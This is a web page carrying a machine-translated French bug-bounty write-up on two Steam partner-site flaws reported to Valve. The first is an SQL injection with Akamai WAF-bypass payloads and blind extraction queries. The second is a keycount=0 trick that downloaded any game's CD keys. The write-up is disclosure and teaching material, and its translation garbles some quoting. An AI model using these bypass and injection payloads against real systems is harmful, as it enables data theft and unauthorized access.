<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🌎 👩‍💼 👩🏻‍🏫 Comment j'ai piraté Steam. Deux fois 👉🏼 🤦🏿 🍵</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Bonjour, Habr! Aujourd'hui, je vais vous expliquer pourquoi Valve a payé les primes les plus importantes de l'histoire de son programme de récompense ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Comment j'ai piraté Steam. Deux fois</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/421215/">  Bonjour, Habr!  Aujourd'hui, je vais vous expliquer pourquoi Valve a payé les primes les plus importantes de l'histoire de son programme de récompense pour les vulnérabilités.  Bienvenue au chat! <br><br><img src="https://habrastorage.org/webt/6j/zb/jq/6jzbjqwm54kjaonciarskoos0fi.png"><br><a name="habracut"></a><br><h3>  1. Injection SQL </h3><br>  Le service <i>partner.steampowered.com</i> est conçu pour recevoir des informations financières des partenaires Steam.  Sur la page du rapport des ventes, un graphique est dessiné avec des boutons qui modifient la période d'affichage des statistiques.  Les voici dans le rectangle vert: <br><br><img src="https://habrastorage.org/webt/kx/sv/rr/kxsvrry7aicwzjut5chb_j2exhg.png"><br><br>  La demande de téléchargement de statistiques ressemble à ceci: <br><br><img src="https://habrastorage.org/webt/vb/26/vy/vb26vydaudwl7rcusm0vyjnek14.png"><br>  <i>où "UA" est le code du pays.</i> <br><br>  Eh bien, il est temps de faire des devis! <br>  Essayons "UA": <br><br><img src="https://habrastorage.org/webt/7s/xu/fp/7sxufpkpcieqwxldj8yuklhui2g.png"><br><br>  Les statistiques ne sont PAS revenues, ce qui est à prévoir. <br><br>  Maintenant «UA» »: <br><br><img src="https://habrastorage.org/webt/f9/pz/pm/f9pzpmv4lem2283_qopey71x69k.png"><br><br>  Les statistiques sont de retour et cela ressemble à une injection! <br><br><div class="spoiler">  <b class="spoiler_title">Pourquoi?</b> <div class="spoiler_text">  Disons que l'instruction de base de données ressemble à ceci: <br><br><pre><code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> countries <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> country_code = <span class="hljs-string"><span class="hljs-string">`UA`</span></span>;</code> </pre> <br>  Si vous envoyez UA ', l'instruction de base de données sera: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> countries <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> country_code = <span class="hljs-string"><span class="hljs-string">`UA`</span></span><span class="hljs-string"><span class="hljs-string">`;</span></span></code> </pre> <br>  Vous avez remarqué un devis supplémentaire?  Et cela signifie que l'instruction n'est pas valide. <br>  Selon la syntaxe SQL, la requête ci-dessous est complètement valide (il n'y a pas de guillemets supplémentaires): <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> countries <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> country_code = <span class="hljs-string"><span class="hljs-string">`UA`</span></span><span class="hljs-string"><span class="hljs-string">``</span></span>;</code> </pre> </div></div><br>  Veuillez noter que nous avons affaire à un tableau de <b>countryFilter []</b> .  J'ai supposé que si nous dupliquions le paramètre <b>countryFilter []</b> dans la requête plusieurs fois, toutes les valeurs que nous envoyions seraient combinées dans la requête SQL de cette manière: <br><br><pre> <code class="sql hljs">'value1', 'value2', 'value3'</code> </pre> <br>  Nous vérifions et nous assurons: <br><br><img src="https://habrastorage.org/webt/tm/t0/ub/tmt0ubgrptaw2iy8gfxwqwkqvnm.png"><br><br>  En fait, nous avons demandé des statistiques à trois pays de la base de données: <br><br><pre> <code class="sql hljs">`UA`, `,` ,`RU`</code> </pre> <br>  La syntaxe est correcte - les statistiques sont de retour :) <br><br>  <b>Contournement du pare-feu d'application Web</b> <br><br>  Les serveurs Steam se cachent derrière Akamai WAF.  Cette honte insère des bâtons dans les roues des bons (et pas si) pirates.  Cependant, j'ai pu le surmonter en combinant les valeurs du tableau en une seule requête (ce que j'ai expliqué ci-dessus) et en commentant.  Tout d'abord, assurez-vous que ce dernier est disponible: <br><br><pre> <code class="hljs powershell">?countryFilter[]=UA`/*&amp;countryFilter[]=*/,`RU</code> </pre> <br>  La demande est valide, il y a donc des commentaires dans notre assortiment. <br><blockquote>  Nous avions plusieurs options de syntaxe, des bases de données locales pour tester les charges utiles, des caractères de commentaire et un nombre infini de citations pour tous les encodages, ainsi que des scripts auto-écrits sur python, de la documentation pour toutes les bases de données, des instructions sur la façon de contourner les pare-feu, wikipedia et antichest.  Ce n'est pas que c'était une réserve nécessaire pour la promotion des injections, mais depuis qu'il a commencé à casser la base de données, il est difficile d'arrêter ... </blockquote>  WAF bloque une demande lorsqu'il y rencontre une fonction.  Saviez-vous que <b>DB_NAME</b> / ** / <b>()</b> est un appel de fonction valide?  Le pare-feu connaît et bloque également.  Mais, grâce à cette fonctionnalité, nous pouvons diviser l'appel de fonction en deux paramètres! <br><br><pre> <code class="hljs scala">?countryFilter[]=<span class="hljs-type"><span class="hljs-type">UA</span></span>',<span class="hljs-type"><span class="hljs-type">DB_NAME</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>(),<span class="hljs-symbol"><span class="hljs-symbol">'RU</span></span></code> </pre> <br>  Nous avons envoyé une demande avec <b>DB_NAME</b> / * de <i>toute façon</i> * / <b>()</b> - WAF n'a rien compris, mais la base de données a réussi à traiter une telle instruction. <br><br>  <b>Récupération des valeurs d'une base de données</b> <br><br>  Ainsi, un exemple d'obtention de la longueur d'une valeur DB_NAME (): <br><br><pre> <code class="hljs sql">https://partner.steampowered.com/report_xml.php?query=QuerySteamHistory&amp;countryFilter[]=',(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">CASE</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">WHEN</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">len</span></span>(DB_NAME<span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>())<span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span>)<span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">THEN</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-string"><span class="hljs-string">'UA'</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">ELSE</span></span><span class="hljs-comment"><span class="hljs-comment">/*&amp;countryFilter[]=*/</span></span><span class="hljs-string"><span class="hljs-string">'qwerty'</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">END</span></span>),<span class="hljs-string"><span class="hljs-string">'</span></span></code> </pre><br>  En SQL: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">CASE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">WHEN</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">len</span></span>(DB_NAME())= <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">THEN</span></span> <span class="hljs-string"><span class="hljs-string">'UA'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">ELSE</span></span> <span class="hljs-string"><span class="hljs-string">'qwerty'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">END</span></span></code> </pre> <br>  Eh bien, humainement: <br><br><pre> <code class="sql hljs">  DB_NAME()  "1",   “UA”,   “qwerty”.</code> </pre> <br>  Cela signifie que si la comparaison est vraie, alors en retour, nous obtenons des statistiques pour le pays «UA».  Il n'est pas difficile de deviner qu'en passant des valeurs de 1 à l'infini, nous trouverons tôt ou tard la bonne. <br><br>  De la même manière, vous pouvez parcourir les valeurs de texte: <br><br><pre> <code class="sql hljs">   DB_NAME()  “a”,  "UA",  "qwerty".</code> </pre> <br>  Habituellement, la fonction «sous-chaîne» est utilisée pour obtenir le Nième caractère, mais WAF l'a obstinément bloqué.  Ici, la combinaison est venue à la rescousse: <br><br><pre> <code class="sql hljs">right(left(system_user,N),1)</code> </pre> <br>  Comment ça marche?  Nous obtenons N caractères de la valeur de system_user dont nous prenons le dernier. <br>  Imaginez que system_user = "steam".  Voici à quoi ressemblera le troisième personnage: <br><br><pre> <code class="sql hljs">left(system_user,3) = ste right(“ste”,1) = e</code> </pre> <br>  Avec un script simple, ce processus a été automatisé et j'ai obtenu le nom d'hôte, l'utilisateur_système, la version et les noms de toutes les bases de données.  Cette information est plus que suffisante (cette dernière est même superflue, mais elle était intéressante) pour démontrer la criticité. <br><br>  Après 5 heures, la vulnérabilité a été corrigée, mais le statut trié lui a été fixé après 8 heures et, bon sang, pour moi, il a été très difficile de 3 heures pour lesquelles mon cerveau a réussi à survivre aux étapes du déni à l'acceptation. <br><br><div class="spoiler">  <b class="spoiler_title">Explication de la paranoïa</b> <div class="spoiler_text">  La vulnérabilité n'ayant pas été désignée comme acceptée, je pensais que la ligne n'avait pas encore atteint mon rapport.  Mais ils ont corrigé le bogue, ce qui signifie qu'ils auraient pu l'enregistrer avant moi. <br></div></div><br><h3>  2. Obtenir toutes les clés de n'importe quel jeu </h3><br>  Dans l'interface du partenaire Steam, il existe une fonctionnalité pour générer des clés de jeu. <br>  Vous pouvez télécharger le jeu de clés généré à l'aide de la demande: <br><br><pre> <code class="hljs ruby"><span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/partner.steamgames.com/partnercdkeys</span></span><span class="hljs-regexp"><span class="hljs-regexp">/assignkeys/</span></span> &amp;sessionid=xxxxxxxxxxxxx&amp;keyid=<span class="hljs-number"><span class="hljs-number">123456</span></span>&amp;sourceAccount=xxxxxxxxx&amp;appid=xxxxxx&amp;keycount=<span class="hljs-number"><span class="hljs-number">1</span></span>&amp;generateButton=Download</code> </pre> <br>  Dans cette demande, le paramètre <b>keyid</b> est l'id de l'ensemble de clés et <b>keycount</b> est le nombre de clés qui doivent être obtenues à partir de cet ensemble. <br><br>  Bien sûr, mes mains se sont immédiatement <b>étendues</b> pour conduire dans différents <b>keyid</b> , mais une erreur m'attendait: « <i>Impossible de générer des clés de CD: Aucune affectation pour l'utilisateur.</i>  ".  Il s'est avéré que tout n'était pas si simple, et Steam a vérifié si je possédais le jeu de clés demandé.  Comment ai-je pu contourner ce test?  Attention ... <br><br><pre> <code class="hljs">keycount=0</code> </pre> <br>  Un fichier a été généré avec 36 000 clés du jeu Portal 2. Wow. <br>  Ce n'est que dans un jeu que ce nombre de clés.  Et tous les ensembles en ce moment plus de 430 000.  Ainsi, en triant les valeurs de <b>keyid,</b> <s>j'étais un</s> attaquant potentiel qui pouvait télécharger toutes les clés jamais générées par les développeurs de jeux Steam. <br><br><h3>  Conclusions </h3><br><ul><li>  Les systèmes WAF coûteux des plus grandes entreprises sont loin de garantir la sécurité de vos applications Web. </li><li>  Si vous êtes un chasseur d'insectes, essayez de pénétrer le plus profondément possible.  Moins les utilisateurs ont accès à une interface, plus il est probable qu'il trouve une vulnérabilité dans cette interface. </li><li>  Développeurs et propriétaires d'entreprise, il n'y a pas d'applications absolument sûres!  Mais vous tenez bon.  Bonne humeur! <br></li></ul><br><div class="spoiler">  <b class="spoiler_title">Mais sérieusement</b> <div class="spoiler_text">  Faites des pentests, payez pour les vulnérabilités, réfléchissez de manière stratégique. <br></div></div></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr421215/">https://habr.com/ru/post/fr421215/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr421201/index.html">Nouveautés d'AppCode 2018.2</a></li>
<li><a href="../fr421205/index.html">Il y a 110 ans: trigonométrie, taux de change du dollar et cierges magiques</a></li>
<li><a href="../fr421207/index.html">Situation: deux vulnérabilités dans la pile TCP du noyau Linux sont fermées</a></li>
<li><a href="../fr421211/index.html">Préférences de stratégie de groupe et PowerShell lorsque les imprimantes comptent pour des centaines</a></li>
<li><a href="../fr421213/index.html">DJI Mavic 2 Pro / Zoom sur les détails</a></li>
<li><a href="../fr421217/index.html">Prise en charge de Python dans Power BI</a></li>
<li><a href="../fr421221/index.html">Thérapie sévère: cure pour MacOS</a></li>
<li><a href="../fr421223/index.html">DevFest SPB 2018</a></li>
<li><a href="../fr421225/index.html">Diagnostic SENS. Biomarqueurs de dysfonctionnement mitochondrial et de stress oxydatif</a></li>
<li><a href="../fr421227/index.html">Présentation des cadres de développement mobile multiplateforme</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>